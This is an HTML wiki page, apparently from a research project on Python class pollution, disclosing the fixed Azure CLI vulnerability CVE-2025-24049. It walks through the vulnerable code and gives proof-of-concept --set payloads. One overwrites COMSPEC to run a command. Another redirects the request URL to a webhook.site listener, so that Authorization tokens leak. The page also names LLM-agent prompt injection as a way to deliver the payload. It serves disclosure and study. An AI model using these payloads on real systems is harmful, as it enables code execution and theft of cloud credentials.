@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Azure CLI | Python Class Pollution</title>
+    <link rel="stylesheet" href="/wiki/css/wiki.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+<body>
+    <div class="wiki-layout">
+        <nav class="sidebar">
+            <div class="sidebar-header">
+                <a href="/wiki/docs/">Class Pollution Wiki</a>
+            </div>
+            <ul class="sidebar-nav">
+
+
+    <li>
+        <a href="/wiki/docs/" >Overview</a>
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/taxonomy/" >Taxonomy</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/taxonomy/atomics/" >Get &amp; Set Atomics</a></li>
+            
+            <li><a href="/wiki/docs/taxonomy/primitives/" >Pollution Primitives</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/targets/" >Pollution Targets</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/targets/classes/" >Classes</a></li>
+            
+            <li><a href="/wiki/docs/targets/modules/" >Modules</a></li>
+            
+            <li><a href="/wiki/docs/targets/functions/" >Functions</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/gadgets/" >Gadgets</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/gadgets/rce/" >RCE Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/xss/" >XSS Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/auth-bypass/" >Auth Bypass Gadgets</a></li>
+            
+            <li><a href="/wiki/docs/gadgets/dos/" >DoS Gadgets</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/tool/" >Tool</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/tool/pyrl/" >Pyrl</a></li>
+            
+            <li><a href="/wiki/docs/tool/polluter/" >Polluter</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/collection/" >Showcases &amp; CVEs</a>
+        
+        <ul>
+            
+            <li><a href="/wiki/docs/collection/catalog/" >Catalog</a></li>
+            
+            <li><a href="/wiki/docs/collection/showcases/" >Showcase Walkthroughs</a></li>
+            
+        </ul>
+        
+    </li>
+    
+    <li>
+        <a href="/wiki/docs/defense/" >Defense</a>
+        
+    </li>
+    
+
+</ul>
+
+        </nav>
+        <main class="content">
+            
+<article>
+    <h1 id="azure-cli-cve-2025-24049">Azure CLI (CVE-2025-24049)</h1>
+<p><strong>Azure Command-Line Interface (CLI)</strong> is Microsoft&rsquo;s official tool for managing Azure resources (4.1K stars, 91.6K weekly downloads).</p>
+<table>
+  <thead>
+      <tr>
+          <th>Field</th>
+          <th>Value</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Repository</td>
+          <td><a href="https://github.com/Azure/azure-cli">Azure/azure-cli</a></td>
+      </tr>
+      <tr>
+          <td>Version</td>
+          <td>v2.68.0</td>
+      </tr>
+      <tr>
+          <td>CVE</td>
+          <td><a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-24049">CVE-2025-24049</a></td>
+      </tr>
+      <tr>
+          <td>Type</td>
+          <td>Agnostic-Get × Dual-Set</td>
+      </tr>
+      <tr>
+          <td>Input</td>
+          <td>Local (&ndash;set argument)</td>
+      </tr>
+      <tr>
+          <td>Consequences</td>
+          <td>RCE, Authorization Token Exfiltration</td>
+      </tr>
+      <tr>
+          <td>Status</td>
+          <td>Fixed</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="summary">Summary</h2>
+<p>We identified a class pollution vulnerability in Azure CLI that allows attackers to overwrite global variables and class/function attributes across all Python modules at runtime. This vulnerability can lead to severe consequences, including arbitrary OS command execution and authorization credentials leakage through request hijacking.</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>Azure CLI provides users with the <code>update</code> command to set properties for various resources. For example, the command <code>az webapp update --ids X --set tags.a=b</code> updates the tags of the web app <code>X</code> by adding a key <code>a</code> with the value <code>b</code>. However, the <code>update</code> operation handler, implemented in the <code>set_properties</code> function, does not properly sanitize or filter out &ldquo;dunder&rdquo; (double underscore) keys, such as <code>__globals__</code>. Therefore, attackers can construct a specific key path that traverses from the instance object and pollutes sensitive variables/attributes across global scopes.</p>
+<p>Note that all <code>update</code> commands with the <code>--set</code> argument are vulnerable, as they share the same underlying code. In this report, we use <code>az webapp update</code> as an example.</p>
+<p><a href="https://github.com/Azure/azure-cli/blob/f0b5572c4ccafb383de08beb509045145fdc871f/src/azure-cli-core/azure/cli/core/commands/arm.py#L478-L524"><code>azure/cli/core/commands/arm.py</code></a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_properties</span>(instance, expression, force_string):
+</span></span><span style="display:flex;"><span>    key, value <span style="color:#f92672">=</span> _split_key_value_pair(expression)
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>    name, path <span style="color:#f92672">=</span> _get_name_path(key)
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>    instance <span style="color:#f92672">=</span> _find_property(instance, path)
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> index_value <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>            instance[index_value] <span style="color:#f92672">=</span> value           <span style="color:#75715e"># if destination object is a list</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> isinstance(instance, dict):
+</span></span><span style="display:flex;"><span>            instance[name] <span style="color:#f92672">=</span> value                  <span style="color:#75715e"># if destination object is a dict</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> hasattr(instance, make_snake_case(name)):
+</span></span><span style="display:flex;"><span>                setattr(instance, make_snake_case(name), value)  <span style="color:#75715e"># if destination object is an object</span>
+</span></span></code></pre></div><p><a href="https://github.com/Azure/azure-cli/blob/f0b5572c4ccafb383de08beb509045145fdc871f/src/azure-cli-core/azure/cli/core/commands/arm.py#L658-L706"><code>azure/cli/core/commands/arm.py</code></a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_update_instance</span>(instance, part, path):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(instance, dict):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> instance[part]                    <span style="color:#75715e"># Item-Get (no case conversion)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> hasattr(instance, make_snake_case(part)):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> getattr(instance, make_snake_case(part), <span style="color:#66d9ef">None</span>)  <span style="color:#75715e"># Attr-Get</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_find_property</span>(instance, path):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> part <span style="color:#f92672">in</span> path:
+</span></span><span style="display:flex;"><span>        instance <span style="color:#f92672">=</span> _update_instance(instance, part, path)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> instance
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>snake_regex_1 <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">&#39;(.)([A-Z][a-z]+)&#39;</span>)
+</span></span><span style="display:flex;"><span>snake_regex_2 <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">&#39;([a-z0-9])([A-Z])&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_snake_case</span>(s):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> isinstance(s, str):
+</span></span><span style="display:flex;"><span>        s1 <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>sub(snake_regex_1, <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\1_\2&#39;</span>, s)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> re<span style="color:#f92672">.</span>sub(snake_regex_2, <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\1_\2&#39;</span>, s1)<span style="color:#f92672">.</span>lower()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> s
+</span></span></code></pre></div><p>The functions:</p>
+<ol>
+<li>Split the attacker-controlled key by dots</li>
+<li>Resolve each segment via <code>getattr</code> or <code>__getitem__</code> (Agnostic-Get)</li>
+<li>Set the final attribute with <code>setattr</code> or <code>__setitem__</code> (Dual-Set)</li>
+</ol>
+<p>No validation is performed on the attribute path.</p>
+<h3 id="polluting-all-loaded-modules">Polluting All Loaded Modules</h3>
+<p>To pollute all loaded modules within the current Python runtime, we exploit the <code>modules</code> attribute of the <code>sys</code> module, which contains references to all loaded modules. Since the target module (e.g., <code>azure/mgmt/web/v2023_01_01/models/_models_py3.py</code>) imports <code>sys</code>, it can be accessed through the path <code>__class__.__init__.__globals__.sys</code>. Using this path, we can obtain access to all modules loaded during runtime.</p>
+<h3 id="bypassing-attribute-case-conversion">Bypassing Attribute Case Conversion</h3>
+<p>The <code>make_snake_case</code> function converts attribute names to lowercase (e.g., <code>WebAppsOperations</code> becomes <code>web_apps_operations</code>), preventing direct access to CamelCase class names. However, this restriction applies only to object attributes, not to dictionary keys. To bypass this, we use the <code>__dict__</code> attribute of an object, which returns all attributes as a dictionary, thereby avoiding case conversion. For instance, to access <code>WebAppsOperations</code>, we use:</p>
+<pre tabindex="0"><code>__class__.__init__.__globals__.sys.modules.azure.mgmt.web.v2023_01_01.operations._web_apps_operations.__dict__.WebAppsOperations
+</code></pre><h2 id="poc">PoC</h2>
+<h3 id="consequence-1-os-command-execution">Consequence 1: OS Command Execution</h3>
+<p><a href="https://drive.google.com/file/d/1R-ISsS4aPaY3SIjTK6H1DIYg0wdp9WA7/view?usp=sharing">Video PoC</a></p>
+<p><strong>Steps:</strong></p>
+<ol>
+<li>Open Azure CLI in interactive mode.</li>
+<li>Login and ensure the account has access to certain available resources, e.g., a webapp with id <code>X</code>.</li>
+<li>Input the following payload to pollute <code>os.environ.COMSPEC</code>:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>az resource update --ids <span style="color:#e6db74">&#34;/subscriptions/4aa14d6e-cfd5-4ec6-9b5c-22d3c72dd75c/resourceGroups/cdn/providers/Microsoft.Cdn/profiles/test/endpoints/eduodltiendpoint&#34;</span> --set <span style="color:#e6db74">&#34;__class__.__init__.__globals__.sys.modules.subprocess.os.environ._data.COMSPEC=cmd /c calc&#34;</span>
+</span></span></code></pre></div><ol start="4">
+<li>Trigger command execution via any of the following:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>az blueprint -h
+</span></span><span style="display:flex;"><span>az upgrade
+</span></span><span style="display:flex;"><span>Ctrl+C
+</span></span></code></pre></div><p><strong>Effect</strong>: On Windows, Azure CLI uses <code>COMSPEC</code> to spawn subprocesses via <code>subprocess.Popen</code> with <code>shell=True</code>. Overwriting it with a malicious command causes arbitrary code execution when Azure CLI subsequently spawns a subprocess (e.g., during extension installation, CLI upgrade, or CLI exit).</p>
+<p><a href="https://github.com/Azure/azure-cli/blob/f0b5572c4ccafb383de08beb509045145fdc871f/src/azure-cli-core/azure/cli/core/extension/dynamic_install.py#L246"><code>azure/cli/core/extension/dynamic_install.py</code></a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_check_value_in_extensions</span>(cli_ctx, parser, args, no_prompt):
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> run_after_extension_installed:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> platform
+</span></span><span style="display:flex;"><span>        exit_code <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>call(args, shell<span style="color:#f92672">=</span>platform<span style="color:#f92672">.</span>system() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Windows&#39;</span>)
+</span></span></code></pre></div><hr>
+<h3 id="consequence-2-authorization-credential-leakage">Consequence 2: Authorization Credential Leakage</h3>
+<p><a href="https://drive.google.com/file/d/1BmCpBTV0PkSZYRFDDA38TVKfU5mt-wZf/view?usp=sharing">Video PoC</a></p>
+<p><strong>Steps:</strong></p>
+<ol>
+<li>Open Azure CLI in interactive mode.</li>
+<li>Login and ensure the account has access to certain available resources, e.g., a webapp with id <code>X</code>.</li>
+<li>Input the following payload to pollute the request URL metadata:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>az webapp update --ids X <span style="color:#e6db74">&#34;--set&#34;</span> <span style="color:#e6db74">&#34;__class__.__init__.__globals__.sys.modules.azure.mgmt.web.v2023_01_01.operations._web_apps_operations.__dict__.WebAppsOperations._create_or_update_initial.metadata.url=https://webhook.site/5d69807c-c2aa-4fc2-b165-78880fac827d&#34;</span>
+</span></span></code></pre></div><ol start="4">
+<li>Listen to the above URL to hook the user request.</li>
+</ol>
+<p><strong>Effect</strong>: When Azure CLI interacts with the server, it uses the <code>url</code> specified in the <code>metadata</code> attribute of <code>WebAppsOperations._create_or_update_initial</code> to construct the request. By polluting this attribute with an attacker-controlled domain, subsequent requests — including those containing the <code>Authorization</code> header — are redirected to the attacker&rsquo;s server, leaking Azure credentials.</p>
+<p><a href="https://github.com/Azure/azure-cli/blob/f0b5572c4ccafb383de08beb509045145fdc871f/src/azure-cli/azure/mgmt/web/v2023_01_01/operations/_web_apps_operations.py"><code>azure/mgmt/web/v2023_01_01/operations/_web_apps_operations.py</code></a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_create_or_update_initial</span>(
+</span></span><span style="display:flex;"><span>    self, resource_group_name: str, name: str, site_envelope: Union[_models<span style="color:#f92672">.</span>Site, IO], <span style="color:#f92672">**</span>kwargs: Any
+</span></span><span style="display:flex;"><span>) <span style="color:#f92672">-&gt;</span> _models<span style="color:#f92672">.</span>Site:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>    request <span style="color:#f92672">=</span> build_create_or_update_request(
+</span></span><span style="display:flex;"><span>        resource_group_name<span style="color:#f92672">=</span>resource_group_name,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>        template_url<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_create_or_update_initial<span style="color:#f92672">.</span>metadata[<span style="color:#e6db74">&#34;url&#34;</span>],  <span style="color:#75715e"># Polluted</span>
+</span></span><span style="display:flex;"><span>        headers<span style="color:#f92672">=</span>_headers,
+</span></span><span style="display:flex;"><span>        params<span style="color:#f92672">=</span>_params,
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    request <span style="color:#f92672">=</span> _convert_request(request)
+</span></span><span style="display:flex;"><span>    request<span style="color:#f92672">.</span>url <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_client<span style="color:#f92672">.</span>format_url(request<span style="color:#f92672">.</span>url)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    pipeline_response: PipelineResponse <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_client<span style="color:#f92672">.</span>_pipeline<span style="color:#f92672">.</span>run(
+</span></span><span style="display:flex;"><span>        request, stream<span style="color:#f92672">=</span>_stream, <span style="color:#f92672">**</span>kwargs
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_create_or_update_initial<span style="color:#f92672">.</span>metadata <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;url&#34;</span>: <span style="color:#e6db74">&#34;/subscriptions/</span><span style="color:#e6db74">{subscriptionId}</span><span style="color:#e6db74">/resourceGroups/</span><span style="color:#e6db74">{resourceGroupName}</span><span style="color:#e6db74">/providers/Microsoft.Web/sites/</span><span style="color:#e6db74">{name}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="impact">Impact</h2>
+<p>Azure CLI is installed on millions of developer machines and CI/CD pipelines. The <code>--set</code> argument is commonly used in automation scripts. An attacker who can influence the <code>--set</code> value (e.g., via a malicious config file, CI pipeline parameter, or LLM agent prompt injection) achieves command execution or credential exfiltration. Microsoft acknowledged and patched the vulnerability, assigning CVE-2025-24049.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p><a href="https://github.com/jackfromeast/python-class-pollution/tree/main/cp-collection/azure-cli/poc"><code>cp-collection/azure-cli/poc/</code></a>
+— runnable exploit environment with <code>run.sh</code> and <code>requirements.txt</code>.</p>
+
+</article>
+
+        </main>
+    </div>
+</body>
+</html>
